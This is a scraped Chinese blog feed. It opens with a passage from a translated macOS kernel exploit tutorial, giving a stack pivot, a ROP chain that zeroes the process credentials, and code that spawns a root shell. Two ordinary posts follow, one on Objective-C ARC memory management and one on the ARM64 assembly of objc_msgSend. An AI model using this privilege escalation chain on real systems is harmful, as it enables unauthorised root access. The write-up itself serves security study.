处的虚表指针之后，我们成功的得到了 RIP 的控制权。 但是，在运行我们的主链之前，我们需要 pivot the stack，比如说，实现 RSP 控制（或者 stack 控制）。这个可以通过多种方式实现，但是最终都是将链地址放入 RSP 中。如果我们没有将 RSP 设置为链地址，那么下一步将不会被执行，因为第一步中的 ret 指令将会返回一个错误的 stack（原始堆栈）。当 RSP 被正确设置了，ret 指令将会从 ROP stack 中读取我们的下一步（或者说下一个函数）的地址，然后将 RIP 设置为这个地址。而这正是我们想要的！ 我使用 NULL 解引用来实现堆栈控制的方法是，使用单个的 gadget 来交换 RSP 和 RAX 的值。如果 RAX 中的值能被控制的话，game’s over！在本例中，RAX 将会始终为0（它将会存储我们构造的 OSData 数据的下一个 8 字节，因此一直是0），所以我们可以在0处放置我们的小转移链，然后将0x20处设置为 pivot。当 RIP 得到被设置到0X20处的地址时，将会执行交换的这个函数，将 RSP 设置为0，然后返回，pop 链中的第一个地址到 RIP，并开始执行这个链。 需要注意的是，这个转移链的目的是什么（mapped at 0）。实际上这会重新将 RSP设置为主链。这样做是因为在0和0X20之间我们没有足够多的空间（只有32 字节，也就是说4个地址），完全不够存储我们的权限提升的链。 1*(volatile uint64_t *)(0x20) = (volatile uint64_t)ROP_XCHG_ESP_EAX(map); // stack pivot 下面是转移的代码，仅仅是读取栈上的值，然后将它 pop 到 RSP 中（之所以我们可以这样做，是因为我们控制了RSP）。 123uint64_t *transfer = (uint64_t *)0x0;transfer[0] = ROP_POP_RSP(map);transfer[1] = (uint64_t)chain-&gt;chain; The main chain马上是这个利用程序的精髓所在了。这部分非常重要：执行内核代码，来提升我们的权限。我们需要先找到我们的进程在内存中的 credentials 结构，然后置0。通过将它置0，我们就可以提升我们的进程权限啦（root 的组 ID 均为0）。 我们所做的实际上跟 setuid(0) 非常相似，但是我们不能直接用这个函数，因为它有权限检测。thread_exception_return 函数用于离开内核空间而不造成崩溃，它通常被用于从内核 traps 中返回。 RAX寄存器保存着前一个函数的返回值，ROP_RAX_TO_ARG1 宏用来将 RAX 寄存器和 RDI（下一个函数的第一个参数）交换。这样就会将上一个函数的返回值作为我们 ROP 链中下一个函数的第一个参数。 123456789101112131415161718192021222324252627/** chain prototype:* * proc = current_proc();* ucred = proc_ucred(proc);* posix_cred = posix_cred_get(ucred);** bzero(posix_cred, (sizeof(int) * 3));** thread_exception_return();*/rop_chain_t *chain = calloc(1, sizeof(rop_chain_t));PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, "_current_proc"));PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, "_proc_ucred"));PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, "_posix_cred_get"));PUSH_GADGET(chain) = ROP_RAX_TO_ARG1(map, chain);PUSH_GADGET(chain) = ROP_ARG2(chain, map, (sizeof(int) * 3));PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, "_bzero"));PUSH_GADGET(chain) = SLIDE_POINTER(find_symbol_address(map, "_thread_exception_return")); 最后我们就可以用跟之前的信息泄漏相同的代码来触发这个漏洞啦： 12345host_get_io_master(mach_host_self(), &amp;master); // get iokit master portkr = io_service_get_matching_services_bin(master, (char *)dict, idx, &amp;res);if (kr != KERN_SUCCESS) return; 没有意外的话，我们将提升我们的权限。为了检测一切是否运行正常，我们简单调用 getuid 函数然后查看它的返回值是否等于0。如果是的话，那么你的进程就已经是 root 权限了，所以简单的调用 system(“/bin/bash”) 来执行 shell 吧！ 1234if (getuid() == 0) &#123; puts("(+) got r00t!"); system("/bin/bash");&#125; 最后，一切正常运行之后，我们的 shell 将会长这样！ 总结这确实是一篇非常长的阅读（对于我来说，也是一次非常长的写作！）。非常感谢你读到这，我认真地希望你能找到这些的乐趣所在。这也是我的第一篇博客文章，还没有写过这么多，如果你在阅读的过程中发现有些粗糙的地方，还请见谅。 下面是文章中所有引用的链接，以及 GitHub repo 的链接，GitHub 上所有的代码都是有效的。再次感谢你的阅读，当我决定写其他东西的时候，我希望你仍然还在。为了保持更新，请在 Twitter 上关注我. PoC Code整个 PoC 的代码都在 GitHub 上，并且有效。 Credits and thanks qwertyoruiop - For exploitation-related help. i0n1c - For original writeup (here). SparkZheng - For his PoC which helped me out with the info-leak! Reference The info leak era on software exploitation –– Fermin J. Serna (@fjserna) Kernel ASLR –– The iPhone Wiki What is a code reuse attack? –– Quora The Geometry of Innocent Flesh on the Bone: Return-into-libc without Function Calls (on the x86) –– Hovav Shacham User Client Info.txt –– Apple Using freed memory –– OWASP An Introduction to Use After Free Vulnerabilities –– Lloyd Simon Attacking the XNU Kernel For Fun And Profit – Part 1 –– Luca Todesco (@qwertyoruiopz) Attacking the XNU Kernel in El Capitan –– Luca Todesco (@qwertyoruiopz) iOS Kernel Heap Armageddon –– Stefan Esser (@i0n1c) What happens in OS when we dereference a NULL pointer in C? –– StackOverflow Stack Pivoting –– Neil Sikka 声明: 本文转载需标明出处，禁止用于商业目的。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[ARC 是如何进行内存管理的]]></title>
      <url>https://amywushu.github.io/2016/12/07/%E5%9F%BA%E7%A1%80%E7%9F%A5%E8%AF%86-ARC-%E6%98%AF%E5%A6%82%E4%BD%95%E8%BF%9B%E8%A1%8C%E5%86%85%E5%AD%98%E7%AE%A1%E7%90%86%E7%9A%84.html</url>
      <content type="text"><![CDATA[任重而道远，不过进一寸便有进一寸的欢喜。 ——改编自胡适语录、小蛋黄儿《恋爱基因缺陷》 基础知识提要对于 Objective-C 对象来讲，手动内存管理主要是通过以下方法来进行的： retain ： 使得对象的引用计数+1 release： 使得对象的引用计数-1 autorelease： 使得对象的引用计数在 autorelease pool 释放的时候再-1 dealloc： 当对象的引用计数为0的时候自动调用，表明对象被释放 因为只有 OC 对象是分配在堆上的（其他如 C 语言对象是分配在栈上的），因此也只有 OC 对象在未开启 ARC 的时候需要我们手动管理内存。 对象的计数器，用来表示当前有多少个事物想令此对象继续存活下去。 对象的内存管理简单内存管理示例 简单的手动内存管理： 12345678910111213141516171819202122// ARC 无效id obj = [[NSObject alloc] init];//obj变量持有NSObject对象，该对象的引用计数=1[obj retain];//NSObject对象的引用计数+1 = 2[obj release];//NSObject对象的引用计数-1 = 1NSAutoreleasePool *pool = [[NSAutoreleasePool alloc] init];//创建自动释放池[obj autorelease];//NSObject对象加入自动释放池，引用计数+1 = 2[pool drain];//自动释放池释放，对池中的所有对象发送 release 消息，因此NSObject对象引用计数-1 = 1[obj release];//NSObject对象的引用计数-1 = 0//自动调用 dealloc 方法，废弃对象 对应的 ARC 自动管理： 因为开启 ARC 后，编译器会自动对 OC 对象进行内存管理，所以，ARC 有效时，不能调用 retain /release /autorelease /dealloc /retainCount 方法，其中，dealloc 方法可以覆写，但依然不能显示调用。 12345678910111213141516//启用 ARC&#123; id obj = [[NSObject alloc] init]; //obj变量持有NSObject对象，该对象的引用计数=1 @autoreleasepool &#123; id __autoreleasing obj2 = obj; //obj变量将NSObject对象赋给带有__autoreleasing关键字的obj2变量，相当于[obj autorelease]； //NSObject对象加入自动释放池，引用计数+1 = 2 &#125; //自动释放池释放，对池中的所有对象发送 release 消息，因此NSObject对象引用计数-1 = 1&#125;//NSObject对象的持有者obj变量超出其作用域，引用失效//因此，NSObject对象的引用计数-1 = 0//自动调用 dealloc 方法，废弃对象 ARC 对象所有权修饰符 __strong： 默认修饰符，表示对对象的“强引用”，该修饰符修饰的变量在超出其作用域时被废弃，随着强引用的失效，自动 release 自己所持有的对象； __weak： 弱引用。不持有对象，若该对象被废弃，则弱引用变量将自动赋值为 nil； __unsafe_unretained： 同 __weak 一样不持有对象，但对象废弃时，不会自动为 nil，容易出现悬挂指针； __autoreleasing： 相当于调用 autorelease 方法，即对象被注册到 autorelease pool 中。 什么叫做持有对象？ 我们知道 OC 对象的变量类型其实是指针变量，这些指针存储在栈上，指针指向的对象存储在堆中。&emsp;&emsp;指针 X1 指向对象 A，并使得对象 A 的引用计数+1，则我们说指针变量 X1 持有对象 A，或者 X1 持有该对象的强引用。&emsp;&emsp;指针 X2 虽然指向对象 A，但是对对象 A 的引用计数没有任何影响，即 X2 不指向对象 A，对象 A 的引用计数也不会减1；X2 指向对象 A，对象 A 的引用计数也不会加1，则我们说指针变量 X2 不持有对象 A。 1234567891011121314151617181920212223242526272829303132//启用 ARCid __weak obj_weak = nil;id __unsafe_unretained obj_unsafe;&#123; id obj0 = [[NSObject alloc] init]; //obj变量默认加了__strong修饰符，所以是强引用，持有NSObject对象，该对象的引用计数+1 =1 obj_weak = obj0; //obj1持有NSObject对象的弱引用，对引用计数无影响 obj_unsafe = obj0; //obj_unsafe不持有NSObject对象，对引用计数无影响 id obj_strong = obj0; //obj3变量默认加了__strong修饰符，是强引用，NSObject对象的引用计数+1 = 2 @autoreleasepool &#123; id __autoreleasing obj_auto = obj0; //obj变量将NSObject对象赋给带有__autoreleasing关键字的obj_auto变量，相当于[obj autorelease]； //obj_auto暂时持有NSObject对象，稍后释放； //NSObject对象被暂时持有，加入自动释放池，引用计数+1 = 3 &#125; //自动释放池释放，obj_auto变量超出其作用域，持有对象失效， //也就是自动释放池取消obj_auto变量对对象的暂时持有权， //相当于对池中的NSObject对象发送 release 消息，因此对象引用计数-1 = 2&#125;//NSObject对象的持有者obj0变量超出其作用域，强引用失效，释放自己所持有的对象，NSObject对象的引用计数-1 = 1；//持有者obj_storng变量超出作用域，强引用失效，释放自己所持有的对象，对象的引用计数-1 = 0；//NSObject对象无持有者（即引用计数为0），自动调用 dealloc 方法，废弃对象；//该对象的弱引用变量obj_weak失效，自动赋值为nil;//obj_unsafe变量表示的对象已被废弃，变为悬挂指针。 修饰符番外 id 的指针或对象的指针会默认加上 __autoreleasing 修饰符，如NSError **error，实际上为NSError *__autoreleasing* error。 &emsp;&emsp;对象被废弃时，含有 __weak 修饰符的变量将会有以下动作：1) 从 weak 表中获取以废弃对象的地址为键值的记录；2) 将包含在记录中的所有 __weak 修饰符变量的地址，赋值为 nil；3) 从 weak 表中删除记录；4) 从引用计数表中删除以被废弃对象的地址为键值的记录。 也就是说含有 __weak 修饰符的变量所指的对象被废弃时，会比其他修饰符多执行前3步，如果大量使用 weak 修饰符，则会消耗相应的 CPU 资源，因此最好是在需要避免循环引用的时候才使用 __weak 修饰符。 在访问有 __weak 修饰符的变量时，其实会访问注册到 autorelease pool 的对象。 { id __weak obj1 = obj; } //实际上为： id obj1; objc_initWeak(&obj1, obj); objc_destroyWeak(&obj1); { id __weak obj2 = obj; NSLog(@"%@", obj2); } //实际上为： id obj2; objc_initWeak(&obj2, obj); id tmp = objc_loadWeakRetained(&obj2); objc_autorelease(tmp); NSLog(@"%@", tmp); objc_destroyWeak(&obj2); 在 @autoreleasepool 块结束之前，使用多少次 weak 变量，就会注册到 autorelease pool 中多少次，所以在使用 __weak 修饰符的变量时，最好赋值给 __strong 修饰符的变量后使用。 可通过 _objc_autoreleasePoolPrint() 函数打印出注册到 autorelease pool 中的对象。 方法的内存管理方法命名规则： alloc/new/copy/mutableCopy 使用这些名称开头的方法，意味着生成的对象自己持有； 以上名称之外的其他方法取得的对象，自己不持有。 注：以 init 开始的方法必须是实例方法，且必须要返回对象，该返回对象不注册到 autorelease pool 上，基本上只是对 alloc 方法返回值的对象进行初始化处理并返回该对象。 12345678910111213141516171819202122232425262728293031323334353637// ARC 无效- (id)allocObject&#123; id obj = [[NSObject alloc] init]; return obj;&#125;- (id)object&#123; id obj = [[NSObject alloc] init]; [obj autorelease]; return obj;&#125;&#123; id obj1 = [obj0 allocObject]; //alloc开头的方法返回自己生成并持有的对象， //即obj变量持有NSObject对象，该对象的引用计数至少=1 id obj2 = [obj0 object]; //取得对象存在，但obj2变量不持有NSObject对象， //该对象的引用计数无变化 [obj2 retain]; //使得obj2持有对象，对象的引用计数+1&#125;//启用ARC- (id)object&#123; id obj = [[NSObject alloc] init]; return obj； //因为return使得变量obj超出作用域，所以强引用失效，自己持有的对象会被释放， //但是因为该对象是作为方法的返回值，所以ARC会自动将其注册到autorelease pool&#125; 也就是说对于非自己持有的方法，比如 [NSMutableArray array] 方法，在其方法内部，自动为返回值添加了 autorelease，我们可以使用这个返回值，但并不持有返回值所指的对象。在其对应的 autorelease pool 释放时（在主线程中，就是 RunLoop 循环一次之后），返回值所指的对象即被释放，如果没有对返回值执行 retain 操作，则对象没有持有者，自动调用 dealloc 方法，被废弃。 我们常说，ARC 有效时，编译器会自动插入 retain/release/autorelease 方法。但实际上，ARC 在调用这些方法时，并不是通过普通的 OC 消息派发机制，而是直接调用底层 C 语言版本，比如 ARC 会调用与 retain 等价的底层函数 objc_retain。这样做更能优化性能，也是不能覆写 retain、release、autorelease 方法的原因，因为这些方法不会被直接调用。 ARC 的优化还体现在很多方面，如使用非自己持有的方法，我们可以看到，在方法内部的返回对象调用 autorelease，与方法返回后，在调用方对返回对象 retain，两个操作实际上是可以抵消的，ARC 会自动做这方面的优化。以 [NSMutableArray array] 为例： // ARC 代码 + (id)array { return [[NSMutableArray alloc] init]; } //编译器的模拟代码 + (id)array { id obj = objc_msgSend(NSMutableArray, @selector(alloc)); objc_msgSend(obj, @selector(init)); return objc_autoreleaseReturnValue(obj); } // ARC 代码 { id obj = [NSMutableArray array]; //obj默认为 __strong 修饰符变量，相当于[返回对象 retain] } //编译器的模拟代码 id obj = objc_msgSend(NSMutableArray, @selector(array)); objc_retainAutoreleasedReturnValue(obj); objc_release(obj); objc_autoreleaseReturnValue 函数会检查使用该函数的方法，或函数调用方的执行命令列表，如果方法的调用方在调用了该方法后，紧接着调用了 objc_retainAutoreleasedReturnValue() 函数，那么就不将返回的对象注册到 autorelease pool 中，而是直接传递到方法的调用方。 Block 的内存管理Block 的内存管理主要涉及到循环引用的问题。 Block 的创建一般是在栈上，但以下情况会被复制到堆上：1) 调用 Block 的 copy 方法时；2) Block 作为函数返回指时；3) 将 Block 赋值给 __strong 修饰符的 id 类型或 Block 类型的成员变量时；4) 在方法名中含有 usingBlock 的 Cocoa 框架方法或 GCD 的 API 中传递 Block 时。 我们知道 Block 会在声明时截获在 Block 内部将会用到的变量，如： 12345678int main()&#123; int val = 10; void (^blk) (void) = ^&#123;printf(val);&#125;; val = 20; blk();//输出结果：10&#125; __strong 变量 对于 OC 对象而言，当 Block 从栈上被复制到堆上时，会对将要用到的带有 __strong 修饰符的变量执行 retain 操作，也就是 Block 会持有这个变量所指向的对象。如： 123456789101112131415161718//开启 ARCtypedef void (^blk_t)(id);blk_t blk;&#123; id array = [[NSMutableArray alloc] init]; blk = ^(id obj) &#123; [array addObject:obj]; NSLog(@"count = %ld", [array count]); &#125;&#125;//array超出作用域，变量被废弃， //但blk持有array所指向的对象，所以对象不会被废弃blk([[NSObject alloc] init]);blk([[NSObject alloc] init]);//输出： count = 1// count = 2&#125; 开启 ARC 时，对于修饰符为 __strong 且捕获了外部变量（无论是否是 OC 对象）的 Block，会自动进行 copy 操作，将 Block 从栈上复制到堆上，由 NSStackBlock 转换为 NSMallocBlock。 修饰符为 __strong 但未捕获外部变量的 Block，或者通过声明全局变量来声明 Block，都会自动创建为 NSGlobalBlock 类型。 无法手动创建堆上的 Block，即 NSMallocBlock。 上述代码中 array 变量超出了作用域因此被废弃，但是 blk 调用的时候仍可以使用 array 是为什么呢？ 是因为 Block 在进行 copy 操作的时候，会在自身结构体中添加一个同类型的 __strong 修饰符的 array 变量，所以访问的并不是之前我们所定义的 id array，而是 block-&gt;array。 __block 变量 __block 修饰符的变量可以在 Block 中更改变量，Block 在捕获变量时，会对有该修饰符的变量生成 __Block_byref_val 结构体。 __block val =10; //在 Block 中存储为结构体 __Block_byref_val_0 val = { void *__isa; __Block_byref_val_0 *__forwarding; //= &val int __flags; int __size; //=sizeof(__Block_byref_val_0) int val; //=10 } __Block_byref_val 结构体的成员变量 __forwarding 是指向该结构体实例自身的指针。Block 在访问__block 修饰的变量时，是通过这个指针来的： block -&gt;val(block结构体中的成员变量)-&gt;__forwarding-&gt;val。当 Block 从栈复制到堆上是，该变量也会复制到堆上，栈上的原来指向自身的 __forwarding 指针会改变为指向堆上的 __block 变量。 因此 __block 修饰的变量在 ARC 和非 ARC 中是有差别的。 ARC 有效时，__block 变量除了可以在 Block 内部修改之外，无其他用处，是否 retain 取决于变量的 ARC 修饰符（__strong 持有、__weak 不持有等）。那么由于可修改，因此可以在 Block 内部对造成循环引用的变量赋值为 nil，释放掉自身的对象持有权，从而打破循环。 ARC 无效时，在 [block copy] 之后，没有__block 修饰符的变量对象会被自动后台 retain，从而被 Block 持有；而有__block 修饰符的变量反而不会被 retain，不会被 Block 持有。因此对变量添加 __block 修饰符可以在非 ARC 情况下打破循环引用。 循环引用既然 Block 也会持有对象，那么就很容易出现不易发现的循环引用问题了。如下： 12345678910111213//开启 ARC- (void)loadView &#123; [super loadView]; _observer = [[NSNotificationCenter defaultCenter] addObserverForName:@"testKey" object:nil queue:nil usingBlock:^(NSNotification *note) &#123; [self dismissModalViewControllerAnimated:YES]; &#125;]; &#125; 正如之前所提到的 Blcok 被复制到堆上的情况，在使用方法名中含有 usingBlock 的 Cocoa 框架方法时会被自动 copy 到堆上，从而对捕获到的 __strong 变量 执行 retain 操作，Block 持有该变量。 &emsp;&emsp;在本例中，self 的成员变量 _observer 会 copy 一份 Block，从而持有 Block，而 Block 中用到了默认为 __strong 修饰符的 self变量 ，从而持有 self，self 类本身又持有 成员变量 _observer，从而导致循环引用，使得谁都无法被最终释放，导致内存泄漏。 所以，要打破这种循环引用，需要使得 [block copy] 时不会 retain 捕获到的 self 变量。 方法一： 在 ARC 中使用不持有对象的 __weak 或 __unsafe_unretain 修饰符1234567891011121314151617//开启 ARC- (void)loadView &#123; [super loadView]; __weak TestViewController *wself = self; _observer = [[NSNotificationCenter defaultCenter] addObserverForName:@"testKey" object:nil queue:nil usingBlock:^(NSNotification *note) &#123; __strong TestViewController *sself = wself; [sself dismissModalViewControllerAnimated:YES]; &#125;]; &#125; &emsp;&emsp;对于拥有 __weak 修饰符的 wself 变量，Block 复制时，不会对该变量指向的对象进行 retain，从而不持有该对象，对该对象的引用计数无影响。在 Block 内部又通过 __strong 修饰符的 sself 变量来持有对象，是为了避免在 Block 执行过程中，该对象被其他地方释放，从而造成访问错误。这实际上是一种延迟 self 的 retain 操作，使得它不在 Block 被 copy 的时候 retain，而是在执行的时候 retain。 &emsp;&emsp;因为如果在最初 copy 的时候 retain，那么只有等 Block 被废弃时，该变量才会被废弃，从而释放对对象 X 的持有权。但是由于循环引用，该变量始终直接或间接的持有 block 对象，所以 Block 永远不会被废弃，进而也不会释放对象 X 的持有权，从而造成这两块内存永远不会被回收，即内存泄漏。 &emsp;&emsp;而在执行的时候 retain，ARC会对 Block 的执行作用域的变量自动进行内存管理，执行完毕后即释放，不会等到 Block 被废弃时才能被释放，因此打破了循环引用。 方法二：在 ARC 中使用 __block 修饰符，并在 Block 中为其赋值为 nil12345678910111213141516//开启 ARC- (void)loadView &#123; [super loadView]; __blok TestViewController *wself = self; _observer = [[NSNotificationCenter defaultCenter] addObserverForName:@"testKey" object:nil queue:nil usingBlock:^(NSNotification *note) &#123; [wself dismissModalViewControllerAnimated:YES]; &#125;]; wself = nil;&#125; 由于在 Block 执行时释放了对 self 所指向的对象的持有权，因此 Block 执行后即打破循环引用，同样不会等到 Block 被废弃时才能释放对象的持有权，因为没有内存泄漏。 &emsp;&emsp;这种方法的缺点是，一定要确保 Block 会执行。如果有多种分支，而某一条分支中的 Block 不会执行，那么这条分支同样会造成内存泄漏。 方法三：在非 ARC 中使用 __block 修饰符1234567891011121314// ARC 无效- (void)loadView &#123; [super loadView]; __blok TestViewController *wself = self; _observer = [[NSNotificationCenter defaultCenter] addObserverForName:@"testKey" object:nil queue:nil usingBlock:^(NSNotification *note) &#123; [wself dismissModalViewControllerAnimated:YES]; &#125;]; &#125; 由于在非 ARC 中，Block 不持有 __block 修饰符修饰的对象，因此也不会造成循环引用。 注1：在使用委托 delegate 时，属性要用 weak 关键字也是为了避免循环引用。注2：在异常 NSException 处理过程中，也容易遗忘对象释放，从而造成内存泄漏，一般须在 @finally 中将未释放的资源释放掉。当然如果该异常直接造成程序崩溃，也就无所谓释放不释放了。 以上即是 ARC 与非 ARC 的内存管理区别，以及 ARC 是如何将手动管理转换为自动管理的。 Reference[1] 《Objective-C 高级编程 - iOS 与 OS X 多线程和内存管理》[2] 《Effective Objective-C 2.0》[3]&ensp;Objective-C中block实现和技巧学习 http://www.tuicool.com/articles/aQFV7bv 声明: 本文转载需标明出处，禁止用于商业目的。]]></content>
    </entry>

    
    <entry>
      <title><![CDATA[通过汇编解读 objc_msgSend]]></title>
      <url>https://amywushu.github.io/2016/11/09/%E9%80%86%E5%90%91%E7%9F%A5%E8%AF%86-%E9%80%9A%E8%BF%87%E6%B1%87%E7%BC%96%E8%A7%A3%E8%AF%BB-objc_msgSend.html</url>
      <content type="text"><![CDATA[想做一条瀑布，每一秒钟都可以跳楼。 ——出处不详 基础知识提要调用方法，本质是发送消息。比如： 12345Person *p = [[Person alloc] init];[p test];// 本质是发送消息： clang -rewrite-objc main.m((void (*)(id, SEL))(void *)objc_msgSend)((id)p, sel_registerName("test")); 当编译器遇到一个方法调用时，它会将方法的调用翻译成以下函数中的一个，objc_msgSend、 objc_msgSend_stret、 objc_msgSendSuper 和 objc_msgSendSuper_stret。 发送给对象的父类的消息会使用 objc_msgSendSuper ; 有数据结构作为返回值的方法会使用 objc_msgSendSuper_stret 或 objc_msgSend_stret ; 其它的消息都是使用 objc_msgSend 发送的。 也就是说所有的方法调用，都是通过 objc_msgSend（或其大类）来实现转发的。 objc_msgSend 的具体实现由汇编语言编写而成，不同平台有不同的实现，objc-msg-arm.s、objc-msg-arm64.s、objc-msg-i386.s、objc-msg-simulator-i386.s、objc-msg-simulator-x86_64.s、objc-msg-x86_64.s。本文以 ARM64 平台为例。 汇编分析汇编概览如下图所示： 流程图分析分支1：X0 = 0 这条分支很简单，对照图1的总图来讲，就是蓝色的那条线，第1行-&gt;第2行-&gt; 29 -&gt; 35~41 ret。先对传入的 X0（即对象地址）作判断，如果 X0=0，则直接返回。 分支2：X0 &lt; 0 (Tagger Pointer) 对照图1来讲，流程为黄色的那根线，1~2 -&gt; 29~34 -&gt; 6 -&gt; … 判断 X0&lt;0，即地址最高位为1，这是 Tagger Pointer 类型的标志（对于 ARM64 架构来讲），关于这个类型，部分内容在我之前的文章copy 与 mutableCopy（传说中的深浅拷贝）中5.4节有提到。 loc_1800b9c30 这个模块取出了 Tagger Pointer 的类索引表，赋值给 X10。下一行 UBFM X11,X0,#0x3C,#0x3F，取 0x3C~0x3F 中的值赋给 X11，其余位以0填充，与图1第32行的意思相同，都是取出最高4位，比如 NSString 类型的 Tagger Pointer 最高4位为 a，运算过后，x11 = 0xa 。接着 LDR X9,[X10,X11,LSL#3]，先运算 X11 左移3位等于 0x50。x9 = x10[0x50]，也就是在类索引表中查找所属类。找到后跳到 loc_1800b9BD0，也就是图1中的第6行。 分支3：X0 &gt; 0 这是大多数情况会走的流程。 1234567//类的结构struct objc_class : objc_object &#123; // Class ISA; //继承自objc_object Class superclass; // 父类引用 cache_t cache; // 用来缓存指针和虚函数表 class_data_bits_t bits; // class_rw_t 指针加上 rr/alloc 标志&#125; 接下来我们根据汇编指令一条条来分析。LDR X13,[X0] 取出调用方法的对象指针保存的地址（从上面代码可以看出，就是 isa 指针地址），赋给 X13。 AND X9,X13,#0x1FFFFFFF8 解读这条指令之前，要先了解 isa 指针的结构。 1234567891011121314151617union isa_t &#123; isa_t() &#123; &#125; isa_t(uintptr_t value) : bits(value) &#123; &#125; Class cls; uintptr_t bits; struct &#123; uintptr_t indexed : 1; uintptr_t has_assoc : 1; uintptr_t has_cxx_dtor : 1; uintptr_t shiftcls : 33; uintptr_t magic : 6; uintptr_t weakly_referenced : 1; uintptr_t deallocating : 1; uintptr_t has_sidetable_rc : 1; uintptr_t extra_rc : 19; &#125;;&#125;; 首先先来看一下这 64 个二进制位每一位的含义： 区域名 代表信息 indexed (0位) 0 表示普通的 isa 指针，1 表示使用优化，存储引用计数 has_assoc (1、2位) 表示该对象是否有 C++ 或 ARC 的析构函数，如果没有，则析构时更快 shiftcls (3~35位) 类的指针 magic (36~41位) 固定值，用于在调试时分辨对象是否未完成初始化 weakly_referenced (42位) 表示该对象是否有过 weak 对象，如果没有，则析构时更快 deallocating (43位) 表示该对象是否正在析构 has_sidetable_rc (44位) 表示该对象的引用计数值是否过大无法存储在 isa 指针 extra_rc (45~63位) 存储引用计数值减一后的结果 也就是说 0x1FFFFFFF8 取1的位数刚好是 shiftcls 的区域，是 isa 指针中存储的该对象的类指针。所以 X9 = isa-&gt;cls。 LDP X10,X11,[X9,#0X10]： X9+16个字节，也就是跳过了8个字节的 isa 指针，和8个字节的 superclass 指针，到了 cache 指针这里。 cache 的结构如下： 12345678910struct bucket_t &#123; void *sel; void *imp;&#125;;struct cache_t &#123; struct bucket_t *buckets; mask_t mask; mask_t occupied;&#125;; 因此，X10=buckets 指针，X11 的低32位为 mask，高32位为 occupied（mask_t 是 int 类型）。 occupied是 cache 中实际拥有的方法个数。 AND W12,W1,W11： 将 _cmd 的低32位和 cache-&gt;mask 作与运算。ADD X12,X10,X12,LSL#4: 与运算后的结果左移4位，作为buckets的索引（相当于数组下标）。这里也可以看出 mask 的作用，应该是一种优化的 hash 表搜索算法。将取得的指针赋给 X12。LDP X16,X17,[X12]： 由 bucket 的结构可以知道，这里是将 bucket [(_cmd&amp;mask)&lt;&lt;4] 中的 sel 赋给 X16，imp 赋给 X17（imp 为方法的入口地址）。这三条指令就是通过 mask 找到一个 bucket 元素。 CMP X16,X1, B.NE loc_1800B9BEC, BR X17： 这3条指令很好理解，比较 bucket 元素中的 sel 和 _cmd 的值是否相等，不相等，则跳到 loc_1800B9BEC 模块，相等则直接进入对应 imp（方法入口地址）。 loc_1800B9BEC CBZ X16,_objc_msgSend_uncached_impcache： 如果 X16=0 则跳到 objc_msgSend_uncached 这个函数去，不等于0则继续执行。CMP X12,X10, B.EQ loc_1800B9C00： 判断是否已搜索到最后一个 bucket（即 bucket 的初始地址），是则跳到 loc_1800B9C00，否则继续执行。 先讨论没有搜索完的情况，loc_1800B9C00 LDP X16,X17,[X12,#-0X10], B loc_1800B9BE0： bucket 元素减16字节，即跳到前一个 bucket 元素，同样将 sel 和 imp 指针赋值，然后跳回与 _cmd 比较的那条指令循环。 直到搜索完毕，ADD X12,X12,W11,UXTW #4： x12 = buckets+(mask&lt;&lt;4)，扩大搜索范围，在缓存内全面搜索。（进行到这一步，说明 bucket [(_cmd&amp;mask)&lt;&lt;4] 元素之前的 bucket 已全部被占满，且均不是我没要找的方法）LDP X16,X17,[X12]： 跟之前的命令意思一样。 可以看到，之后的流程跟前面的循环一模一样，但是加大了搜索范围，从 bucket [mask&lt;&lt;4] 往前开始搜索（进行到这一步说明 bucket [(_cmd&amp;mask)&lt;&lt;4] 前面的缓存都占满了）。从以上分析，我们可以看出，能在缓存 cache 里找到的方法，会直接跳到入口地址 X17。而没有在 cache 里的方法，则要继续调用 objc_msgSend_uncached 函数。现在，返回图1再查看，是不是觉得思路清晰很多呀！ 关于缓存 cahcecache 的原则是缓存那些可能要执行的函数地址。 有一种说法是，只要函数执行过一次的方法，都会存入缓存。但在我的测试中，有时候会遵循这种说法，有时候又不尽然，执行过的方法不一定会被放入缓存，但没有被执行过的肯定不会进入缓存。具体什么样的操作会导致方法被载入缓存，还需要从类的初始化探讨起，此点存疑。 cahce 其实是一个 hash 表，通过 _cmd&amp;mask 的结果再左移4位，作为索引值，如果这个地址存的方法 _cmd2 与 _cmd 不同，那么有两种原因：一是 _cmd 压根儿没被载入缓存；二是由于它的索引值跟 _cmd 相同，但 _cmd2 先进入缓存，因此 _cmd2 占据了这个位置。这时，如果 _cmd 被载入缓存的话，则在 _cmd2 索引值-1的位置存入，如果这个位置也不为0，那么继续前往索引值-2的位置，直到找到一个0位，然后存入。 在上面的汇编分析中，我们也能看到这个思路。在图1中第8行，取 bucket 索引值；第10行，比较 _cmd 值；如果不同则第13行，查看是否为0，如果为0，则不再搜索，直接进入 uncache 函数（因为是0的话，由上一段分析可以知道，说明这个方法没有在缓存里）；如果不为0，则前往索引值-1（地址-16）的位置查找；第17行返回循环到第10行。 下面来做一个测试， 123456789@implementation aboutObjectiveC-(void)objc_msgSend1 &#123; NSLog(@"objc_msgSend1"); [self objc_msgSend2];&#125;-(void)objc_msgSend1 &#123; NSLog(@"objc_msgSend2");&#125; 如上图所示，在 main.m 第17行下断点（即第二次执行 objc_msgSend1 方法时），si 进入 objc_msgSend 函数，然后执行到图1中的第7行，打印各值如下 w11 是 mask 的值为0011，跟 init的 SEL(0x1883910b6) 指针作与运算，为0x2，左移4位为0x20，因此在 x10+0x20 处载入 cache；跟 objc_msgSend1 的 SEL(0x10008ecac) 作与运算，为0x0，左移4位还是0x0，因此在 x10 bucket 处载入 cache；同样对 objc_msgSend2 作与运算左移4位，也是0x20，而 bucket[0x20] 处已经被 init 占用了，因此前往 bucket[0x20-0x10] 处，这个位置是0，所以将 objc_msgSend2 填入缓存的这个位置。如下图所示： lookUpImpOrForward 函数我们已经知道如果缓存中没有找到该方法，则跳转执行 _objc_msgSend_uncached_impcache，在这里又会执行 bl _class_lookupMethodAndLoadCache3 指令，跳转到 _class_lookupMethodAndLoadCache3，由汇编语言的实现回到了 C 函数的实现，这个函数只是简单的调用了另外一个函数 lookUpImpOrForward，并传入参数 cache=NO，这个函数是 Runtime 消息机制中非常重要的一环。 